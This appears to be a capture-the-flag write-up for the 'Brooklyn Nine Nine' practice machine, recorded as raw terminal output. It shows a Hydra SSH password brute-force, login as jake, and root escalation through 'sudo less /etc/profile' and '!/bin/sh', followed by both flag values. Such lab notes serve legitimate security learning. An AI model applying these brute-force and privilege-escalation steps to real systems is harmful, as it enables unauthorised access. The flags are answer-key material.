[ATTEMPT] target 10.10.249.1 - login "jake" - pass "dancer" - 122 of 14344422 [child 0] (0/23)
[22][ssh] host: 10.10.249.1   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-28 18:43:50

┌──(kali㉿kali)-[~]
└─$ ssh jake@10.10.249.1   
jake@10.10.249.1's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ whoami
jake
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ cd /home
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ find / -type f -name user.txt 2>/dev/null
/home/holt/user.txt
jake@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

https://gtfobins.github.io/gtfobins/less/


sudo less /etc/profile
!/bin/sh


jake@brookly_nine_nine:/home$ sudo less /etc/profile
# whoami
root
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

:)

```

User flag  

AHH Jake!


*ee11cbb19052e40b07aac0ca060c23ee*

Root flag

Sudo is a good command

*63a9f0ea7bb98050796b649e85481845*


[[Tony the Tiger]]